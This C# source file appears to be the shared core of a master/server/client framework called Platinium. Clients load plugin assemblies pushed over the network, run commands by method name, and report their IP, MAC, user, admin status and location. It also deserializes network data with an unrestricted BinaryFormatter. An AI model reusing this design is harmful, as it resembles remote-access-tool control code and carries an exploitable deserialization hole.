using Platinium.Shared.Data.Packages;
using Platinium.Shared.Info;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.ComponentModel.Composition;
using System.ComponentModel.Composition.Hosting;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading.Tasks;
using System.Collections;
using System.Net;
using System.Runtime.Serialization;
using Platinium.Shared.Plugin;
using Platinium.Shared.Data.Structures;
using System.Threading;
using Platinium.Shared.Content;
using Platinium.Connection;
using System.Reflection;
using System.Windows.Forms;

namespace Platinium
{
    namespace Shared
    {
        namespace Core
        {
            public partial class Converter
            {
                public static Dictionary<string, object> ClassToDictionary(object objectToConvert)
                {
                    return objectToConvert.GetType()
                         .GetProperties(BindingFlags.Instance | BindingFlags.Public)
                         .ToDictionary(prop => prop.Name, prop => prop.GetValue(objectToConvert, null));
                }
                public static List<Dictionary<string, object>> ClassToDictionaryList(List<object> objectListToConvert)
                {
                    List<Dictionary<string, object>> tempList = new List<Dictionary<string, object>>();
                    foreach (object objectToConvert in objectListToConvert)
                    {
                        tempList.Add(objectToConvert.GetType()
                         .GetProperties(BindingFlags.Instance | BindingFlags.Public)
                         .ToDictionary(prop => prop.Name, prop => prop.GetValue(objectToConvert, null)));
                    }
                    return tempList;
                }
            }
            public static class Extensions
            {
                public static string EmptyIfNull(this object value)
                {
                    if (value == null)
                    {
                        return "NULL";
                    }
                    return value.ToString();
                }
            }
        }
        namespace Content
        {
            public enum PackageType
            {
                Base,
                Plugin,
                PluginCommand,
                Status,
                NoResponse,
                Response
            }
            public interface IContent
            {
                object Data { get; set; }
            }
            [Serializable]
            public class Command : IContent
            {
                public object Data { get; set; }
                public Command()
                {

                }
                public Command(object data)
                {
                    Data = data;
                }
            }
        }
        namespace Plugin
        {
            /// <summary>
            /// The IPlugin Interface.
            /// </summary>
            public interface IPlugin
            {
                void Action();
                void InstantiateClient();
                IPluginClientController ClientController { get; set; }
                UserControlModule PluginInterfaceControl { get; set; }
            }
            public interface IPluginClientController
            {
                Package Action(Package inPackage);
            }
            public class Metadata : Attribute
            {
                public string Name { get; set; }
            }
            public partial class PluginFactory
            {
                public static Package HandlePluginMethods(Package inPackage, BaseInfoType baseInfoType)
                {
                    Package returnPackage = inPackage;
                    string[] commands = inPackage.Command.Split('|');
                    string plugin_name = commands[0];
                    string plugin_command = commands[1];
                    object[] command_parameters = { inPackage };
                    Type type = DataStructure.PluginDictionary[new Metadata { Name = plugin_name }].ClientController.GetType();
                    if (type != null)
                    {
                        MethodInfo methodInfo = type.GetMethod(plugin_command);
                        if (methodInfo != null)
                        {
                            ParameterInfo[] parameters = methodInfo.GetParameters();
                            IPlugin pluginInstance = DataStructure.PluginDictionary[new Metadata { Name = plugin_name }];

                            if (parameters.Length == 0)
                            {
                                returnPackage = (Package)methodInfo.Invoke(pluginInstance.ClientController, null);
                            }
                            else
                            {
                                returnPackage = (Package)methodInfo.Invoke(pluginInstance.ClientController, command_parameters.ToArray());
                            }
                        }
                    }
                    return returnPackage;
                }
            }
        }
        namespace Data
        {
            namespace Packages
            {
                public class PackageFactory
                {
                    public static Package HandleServerPackages(Package inPackage)
                    {
                        Package returnPackage = new Package(null, null, PackageType.Response, inPackage.From, inPackage.To);
                        switch (inPackage.PackageType)
                        {
                            case PackageType.Base:
                                returnPackage = inPackage;
                                break;
                            case PackageType.Plugin:
                                switch (inPackage.Command)
                                {
                                    case "LOAD_PLUGINS":
                                        returnPackage = new Package("LOAD_PLUGINS", DataStructure.AssemblyList, PackageType.Plugin, inPackage.From, inPackage.To);
                                        break;
                                    default:
                                        break;
                                }
                                break;
                            case PackageType.PluginCommand:
                                returnPackage = inPackage;
                                break;
                            case PackageType.Status:
                                break;
                            case PackageType.NoResponse:
                                break;
                            case PackageType.Response:
                                break;
                            default:
                                break;
                        }
                        return returnPackage;
                    }
                    public static Package HandleClientPackages(Package inPackage)
                    {
                        Package returnPackage = new Package(null, null, PackageType.Response, new ClientInfo(BaseInfoType.Server), inPackage.To);
                        switch (inPackage.PackageType)
                        {
                            case PackageType.Base:
                                returnPackage = inPackage;
                                break;
                            case PackageType.Plugin:
                                switch (inPackage.Command)
                                {
                                    case "LOAD_PLUGINS":
                                        DataStructure.AssemblyList = (List<byte[]>)inPackage.Content;
                                        Console.WriteLine("LOADED ASSEMBLIES");
                                        foreach (var assemblyData in DataStructure.AssemblyList)
                                        {
                                            Assembly assembly = Assembly.Load(assemblyData);
                                            DataStructure.LoadedAssemblyList.Add(assembly);
                                        }
                                        Type pluginType = typeof(IPlugin);
                                        ICollection<Type> pluginTypes = new List<Type>();
                                        foreach (Assembly assembly in DataStructure.LoadedAssemblyList)
                                        {
                                            Type[] types = assembly.GetTypes();
                                            foreach (Type type in types)
                                            {
                                                if (!type.IsInterface || !type.IsAbstract)
                                                {
                                                    if ((type.GetInterface(pluginType.FullName) != null) && (!type.IsInterface || !type.IsAbstract))
                                                    {
                                                        pluginTypes.Add(type);
                                                    }
                                                }
                                            }
                                        }
                                        foreach (Type type in pluginTypes)
                                        {
                                            IPlugin plugin = (IPlugin)Activator.CreateInstance(type);
                                            var pluginMetadata = (Metadata[])type.GetCustomAttributes(typeof(Metadata), true);
                                            DataStructure.PluginDictionary.Add(pluginMetadata[0], plugin);
                                            plugin.InstantiateClient();
                                        }
                                        break;
                                    default:
                                        break;
                                }
                                break;
                            case PackageType.PluginCommand:
                                returnPackage = PluginFactory.HandlePluginMethods(inPackage, BaseInfoType.Client);
                                break;
                            case PackageType.Status:
                                break;
                            case PackageType.NoResponse:
                                break;
                            case PackageType.Response:
                                break;
                            default:
                                break;
                        }
                        return returnPackage;
                    }
                    public static Package HandleMasterPackages(Package inPackage)
                    {
                        Package returnPackage = new Package(null, null, PackageType.Response, new ClientInfo(BaseInfoType.Server), inPackage.To);
                        switch (inPackage.PackageType)
                        {
                            case PackageType.Base:
                                returnPackage = inPackage;
                                break;
                            case PackageType.Plugin:
                                switch (inPackage.Command)
                                {
                                    case "LOAD_PLUGINS":
                                        DataStructure.AssemblyList = (List<byte[]>)inPackage.Content;
                                        Console.WriteLine("LOADED ASSEMBLIES");
                                        foreach (var assemblyData in DataStructure.AssemblyList)
                                        {
                                            Assembly assembly = Assembly.Load(assemblyData);
                                            DataStructure.LoadedAssemblyList.Add(assembly);
                                        }
                                        Type pluginType = typeof(IPlugin);
                                        ICollection<Type> pluginTypes = new List<Type>();
                                        foreach (Assembly assembly in DataStructure.LoadedAssemblyList)
                                        {
                                            Type[] types = assembly.GetTypes();
                                            foreach (Type type in types)
                                            {
                                                if (!type.IsInterface || !type.IsAbstract)
                                                {
                                                    if ((type.GetInterface(pluginType.FullName) != null) && (!type.IsInterface || !type.IsAbstract))
                                                    {
                                                        pluginTypes.Add(type);
                                                    }
                                                }
                                            }
                                        }
                                        foreach (Type type in pluginTypes)
                                        {
                                            IPlugin plugin = (IPlugin)Activator.CreateInstance(type);
                                            var pluginMetadata = (Metadata[])type.GetCustomAttributes(typeof(Metadata), true);
                                            MethodInfo[] methodInfo = type.GetMethods(BindingFlags.Public | BindingFlags.Instance);
                                            DataStructure.PluginDictionary.Add(pluginMetadata[0], plugin);
                                            DataStructure.PluginMethodDictionary.Add(pluginMetadata[0], methodInfo);
                                        }
                                        break;
                                    default:
                                        break;
                                }
                                break;
                            case PackageType.PluginCommand:
                                returnPackage = PluginFactory.HandlePluginMethods(inPackage, BaseInfoType.Master);
                                break;
                            case PackageType.Status:
                                break;
                            case PackageType.NoResponse:
                                break;
                            case PackageType.Response:
                                break;
                            default:
                                break;
                        }
                        return returnPackage;
                    }
                }
                [Serializable]
                public class Package
                {
                    public ClientInfo To { get; private set; }
                    public ClientInfo From { get; private set; }
                    public string Command { get; private set; }
                    public object Content { get; private set; }
                    public PackageType PackageType { get; private set; }
                    public Package(string command, object obj, PackageType packagetype, ClientInfo to, ClientInfo from)
                    {
                        Command = command;
                        To = to;
                        PackageType = packagetype;
                        From = from;
                        Content = obj;
                    }
                    public Package(string command, object obj, PackageType packagetype, ClientInfo from)
                    {
                        Command = command;
                        From = from;
                        Content = obj;
                        PackageType = packagetype;
                    }
                }
                [Serializable]
                public class TransportPackage
                {
                    public byte[] Data = new byte[1048576];
                    public TransportPackage()
                    {

                    }
                    public TransportPackage(byte[] data)
                    {
                        Data = data;
                    }
                }
            }
            namespace Serialization
            {
                sealed class AllowAllAssemblyVersionsDeserializationBinder : SerializationBinder
                {
                    public override Type BindToType(string assemblyName, string typeName)
                    {
                        Type typeToDeserialize = null;

                        String currentAssembly = Assembly.GetExecutingAssembly().FullName;

                        // In this case we are always using the current assembly
                        assemblyName = currentAssembly;

                        // Get the type using the typeName and assemblyName
                        typeToDeserialize = Type.GetType(String.Format("{0}, {1}",
                            typeName, assemblyName));

                        return typeToDeserialize;
                    }
                }
                public class Serializer
                {
                    public static TransportPackage Serialize(object objToSerialize)
                    {
                        using (var memoryStream = new MemoryStream())
                        {
                            BinaryFormatter bf = new BinaryFormatter();
                            bf.Binder = new AllowAllAssemblyVersionsDeserializationBinder();
                            (bf).Serialize(memoryStream, objToSerialize);
                            return new TransportPackage(memoryStream.ToArray());
                        }
                    }
                    public static object Deserialize(TransportPackage package)
                    {
                        using (var memoryStream = new MemoryStream(package.Data))
                        {
                            BinaryFormatter bf = new BinaryFormatter();
                            bf.Binder = new AllowAllAssemblyVersionsDeserializationBinder();
                            memoryStream.Seek(0, SeekOrigin.Begin);
                            return (bf).Deserialize(memoryStream);
                        }
                    }
                    public static byte[] SerializeToByte(object objToSerialize)
                    {
                        using (var memoryStream = new MemoryStream())
                        {
                            (new BinaryFormatter()).Serialize(memoryStream, objToSerialize);
                            return memoryStream.ToArray();
                        }
                    }
                    public static object DeserializeFromByte(byte[] data)
                    {
                        using (var memoryStream = new MemoryStream(data))
                        {
                            BinaryFormatter bf = new BinaryFormatter();
                            bf.Binder = new AllowAllAssemblyVersionsDeserializationBinder();
                            return (bf).Deserialize(memoryStream);
                        }
                    }
                }
            }
            namespace Structures
            {
                [Serializable]
                public static class DataStructure
                {
                    public static List<ClientInfo> MasterList = new List<ClientInfo>();
                    public static List<ClientInfo> ClientList = new List<ClientInfo>();
                    public static Dictionary<Metadata, IPlugin> PluginDictionary = new Dictionary<Metadata, IPlugin>();
                    public static Dictionary<Metadata, MethodInfo[]> PluginMethodDictionary = new Dictionary<Metadata, MethodInfo[]>();
                    public static List<byte[]> AssemblyList = new List<byte[]>();
                    public static List<Assembly> LoadedAssemblyList = new List<Assembly>();
                }
            }
        }
        namespace Info
        {
            public class LocationInfo
            {
                public string City { get; set; }
                public string Country { get; set; }
                public float Latitude { get; set; }
                public float Longitude { get; set; }
                public string Region { get; set; }
                public int TimeZone { get; set; }
                public string ZipCode { get; set; }
            }
            public enum BaseInfoType
            {
                Client,
                Master,
                Server
            }
            [Serializable]
            public class ClientInfo : IEnumerable<object>
            {
                public string IP { get; set; }
                public string MACAddress { get; set; }
                public string UserName { get; set; }
                public string UID { get; set; }
                public string Language { get; set; }
                public bool IsAdministrator { get; set; }
                public LocationInfo Location { get; set; }
                public string OSName { get; set; }
                public short AppVersion { get; set; }
                public string FrameworkVersion { get; set; }
                public List<Metadata> Plugins { get; set; }

                public BaseInfoType Type { get; set; }
                public Connector Connector { get; set; }
                public ClientInfo()
                {

                }
                public ClientInfo(string uid, BaseInfoType type)
                {
                    UID = uid;
                    Type = type;
                }
                public ClientInfo(string uid)
                {
                    UID = uid;
                    Type = BaseInfoType.Client;
                }
                public ClientInfo(BaseInfoType type)
                {
                    Type = type;
                }
                private IEnumerable<object> Info()
                {
                    yield return IP;
                    yield return MACAddress;
                    yield return UserName;
                    yield return OSName;
                    yield return AppVersion;
                    yield return FrameworkVersion;
                    yield return IsAdministrator;
                    yield return UID;
                    yield return Language;
                    yield return Location.City;
                    yield return Location.ZipCode;
                    yield return Location.Country;
                    yield return Location.Region;
                    yield return Location.TimeZone;
                    yield return Location.Latitude;
                    yield return Location.Longitude;
                    yield return Type;
                    yield return Plugins;
                }
                public IEnumerator<object> GetEnumerator()
                {
                    return Info().GetEnumerator();
                }
                IEnumerator IEnumerable.GetEnumerator()
                {
                    return GetEnumerator();
                }
            }
        }
    }
}
